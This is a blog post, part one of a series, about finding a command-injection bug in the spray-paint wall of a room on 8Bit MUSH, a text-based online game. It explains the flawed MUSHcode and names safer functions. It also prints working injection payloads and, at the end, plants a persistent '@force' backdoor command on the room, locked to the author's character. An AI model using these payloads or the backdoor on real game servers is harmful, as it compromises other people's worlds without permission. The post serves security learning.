---
id: 2498
title: 'Back-Alley Hacking: 8Bit MUSH (Part One)'
date: '2021-02-20T15:55:52+00:00'
author: matt
guid: '/?p=2498'
permalink: /back-alley-hacking-8bit-mush-part-one/
categories:
    - MUSH
tags:
    - MUSH
---

I created a MUSH called [Parlor City](/mush) in the beginning of 2019. This is an online, multi-player, text-based social game that uses a rudimentary code base for world-building.

Parlor City was opened after about 18 months of work, at which time I sought out another MUSH where I could gain some experience and a change of scenery. MUSH [trackers](http://mudstats.com) suggest that there are roughly eight-hundred different MUSH-style games available, each with unique themes and styles.

I asked users of [PennMUSH](https://www.pennmush.org) (an invaluable coding forum) if any particular crew was known to be hostile or disreputable. The answer came back: "The folks at 8Bit have been known to break MUSHes for fun." So that's what I wanted to join.

<!--more-->

# 8Bit MUSH

[8Bit MUSH](http://ansiart.com) is a collaborative world with text-based artwork, a virtual economy, and a lively social scene. Some areas of the MUSH are over twenty years old. 8Bit has a raucous – often antagonistic – userbase and gameplay is relatively unmoderated. Combined with some inter-MUSH conflicts from previous 8Bit epochs, this has earned them a level of infamy among the greater MUSH community.

Like any other web technology, MUSH code itself is susceptible to vulnerabilities. Much of the time spent developing my own MUSH was devoted to creating a world resilient to malicious users. After establishing myself as an 8Bit resident and taking a few arrows ("darts" actually) I wanted to explore the security posture of a world as open and extensible as theirs.

"The 8Bit Times" is a good way to learn the history of 8Bit, and can be purchased from a vendor in the Government District. One issue (Volume 7, Article 13) discusses some of the earliest artwork across 8Bit. It mentions an area called "The Alley" that has a dumpster and a wall that one can spray paint on. I visited to have a better look.

# Dangerous Code

Here's an abbreviated version of the Alley (without the art):

```text
> look
Alley
A grime-covered alley way with trash piled about. Old newspapers blow around, and the bricks have been spray painted.
> view bricks
A brick wall:
Bad dude was here!
H a c k  t h e  P l a n e t
ALL WORK AND NO PLAY
Cans of Red, Green, Blue, Yellow, and Violet spray paint have been left here. Type 'spray <color> <message>' to scrawl a message on the wall.
> spray red Hello, world!
TacoSal sprays something on the wall in red spray paint.
> view bricks
A brick wall:
Hello, world!
H a c k  t h e  P l a n e t
ALL WORK AND NO PLAY
```
Any functionality that handles arbitrary user input is inherently dangerous. MUSH platforms offer a number of functions to sanitize user input in different ways: `decompose()`, `escape()`, and `secure()`.

Ideally, these shouldn't be needed because user input should never be placed into a context where it can be evaluated as code by an object. This can often be accomplished using the `get()` function, which retrieves an object's stored attributes without evaluating them. These attributes should also be set `NO_COMMAND` to prevent users from creating new commands with malicious input.

When entering commands, input is first evaluated by the MUSH platform using the context and permissions of the user. So it's possible to write `The answer is 42!` on the wall as follows:

```text
> spray red The answer is [add(40,2)]!
TacoSal sprays something on the wall in red spray paint.
> view bricks
A brick wall:
Hello, world!
The answer is 42!
ALL WORK AND NO PLAY
```
However, by escaping the control characters in another code example, we can determine whether user input is being handled safely by the object. We'll use the following input:

`spray red Howdy! %[pemit(%%#,We have liftoff)%]`

In this example, the percent symbols act as escape characters when they don't match another hard-coded substitution. So after our string is evaluated on input, the object will receive the following:

`spray red Howdy! [pemit(%#,We have liftoff)]`

...which, if evaluated by the object, will print our message separately using `pemit()`. Let's see:

```text
> spray red Howdy! %[pemit(%%#,We have liftoff)%]
TacoSal sprays something on the wall in red spray paint.
> view bricks
We have liftoff
A brick wall:
Hello, world!
The answer is 42!
Howdy!
```
Bingo! This object is vulnerable to command injection. Let's set the object as `VISUAL` and see what's going on:

```text
> spray red Bazooka Joe %[set(me,VISUAL)%]%[pemit(%%#,DBREF = %[num(me)%])%]
TacoSal sprays something on the wall in red spray paint.
> view bricks
DBREF = #9485
We have liftoff
A brick wall:
Bazooka Joe
The answer is 42!
Howdy!
> ex #9485
Alley(#9485RISVB)
Type: Room
Flags: TRUST STICKY VISUAL BATHROOM
Owner: 8BitMUSH  Zone: NOTHING  Coins: 0
Parent: NOTHING
Created: Sat Apr 28 13:14:31 2001
Last Modification: Tue Feb 16 21:34:38 2021
G_1 [#7841]: ansi(rh,edit(mid(secure(Bazooka Joe [set(me,VISUAL)][pemit(%#,DBREF = [num(me)])]),0,79),
,))
G_2 [#7841]: ansi(rh,edit(mid(secure(The answer is 42!),0,79),
,))
G_3 [#7841]: ansi(rh,edit(mid(secure(Howdy! [pemit(%#,We have liftoff)]),0,79),
,))
SPRAY [#1000]: $spray * *:@swi/first [match(red blue green yellow violet,lcstr(secure(%0)))]=0,{@pemit %#=The only colors here are [ansi(rh,Red)], [ansi(bh,Blue)], [ansi(gh,Green)], [ansi(yh,Yellow)], and [ansi(mh,Violet)].},{[set(me,G_[inc(rand(3))]:ansi([switch(lcstr(secure(%0)),green,gh,blue,bh,red,rh,violet,mh,yh)],edit(mid(secure(%1),0,79),%r,)))];@remit me=%n sprays something on the wall in [switch(lcstr(secure(%0)),green,[ansi(gh,green)],blue,[ansi(bh,blue)],red,[ansi(rh,red)],violet,[ansi(mh,violet)],[ansi(yh,yellow)])] spray paint.}
V_BRICKS [#1000]: A brick wall:[iter(lnum(1,3),%r[u(me/G_##)])]%rCans of [ansi(rh,Red)], [ansi(gh,Green)], [ansi(bh,Blue)], [ansi(yh,Yellow)], and [ansi(mh,Violet)] spray paint have been left here. Type '[ansi(g,spray <color> <message>)]' to scrawl a message on the wall.
```
Reviewing the `spray` function, we can see that the author intended to store input using this transformation:

`edit(mid(secure(%1),0,79),%r,)`

...which would pass the raw input through the `secure()` function, trim it at 79 characters, and remove all blank lines from it. However, these functions do not execute (for lack of one further set of enclosing square brackets?) and are instead stored in the `G_#` attributes literally. When the `view` command is invoked, these attributes are evaluated with `ufun()` as follows:

`[u(ansi(rh,edit(mid(secure(Howdy! [pemit(%#,We have liftoff)]),0,79),%r,)))]`

The nested functions are evaluated from inside out and our arbitrary commands are executed.

# Next Steps

We can add a new command to the Alley for running our own actions going forward. We'll use regular escape characters this time:

```text
> spray red \[set(me,CMD_SUDO:$sudo *\:@force me=\\\%0)\]
> view bricks
> sudo think pemit(%#,get(me/CMD_SUDO))
$sudo *:@force me=%0
```
We better lock it down so that no one else can use it:

```text
> sudo think set(me,CMD_SUDO:$sudo *\:@swi/first \\\[strmatch(\\\%#\\,#30406)\\\]\\=0\\,\\{@pem/s \\\%#\\=Permission denied.\\}\\,\\{@force me=\\\%0\\}) 
```
What is the impact of being able to execute commands as this vulnerable Alley room? We will take a look in [Part Two](/back-alley-hacking-8bit-mush-part-two/)!
